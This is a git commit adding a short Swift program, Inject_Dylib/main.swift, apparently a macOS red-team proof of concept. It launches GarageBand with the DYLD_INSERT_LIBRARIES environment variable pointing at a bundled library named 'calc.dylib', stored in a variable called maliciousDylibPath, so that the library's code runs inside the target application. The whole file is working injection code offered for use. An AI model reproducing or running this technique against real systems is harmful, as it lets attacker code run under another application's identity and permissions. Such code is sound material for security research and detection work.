3e8a8fe3bf6e7d2dd268384601a90386fe5279e5
Cedric Owens <41086586+cedowens@users.noreply.github.com>
2022-01-02 12:25:26 -0500

    Add files via upload

---
+++ Inject_Dylib/main.swift
@@ -0,0 +1,28 @@
+//
+//  main.swift
+//  Inject_Dylib
+//
+//  Created by Dev on 1/2/22.
+//
+
+import Foundation
+import Cocoa
+
+var binpath = URL(fileURLWithPath: "/Applications/GarageBand.app")
+var maliciousDylibPath = Bundle.main.path(forResource: "calc", ofType: "dylib")
+let conf = NSWorkspace.OpenConfiguration.init()
+conf.environment = ["DYLD_INSERT_LIBRARIES" : maliciousDylibPath!]
+
+
+NSWorkspace.shared.openApplication(at: binpath, configuration: conf, completionHandler: {(myapp,error) in
+    if let error = error {
+        print(error)
+    }
+    else {
+        
+    }
+})
+
+sleep(3)
+
+
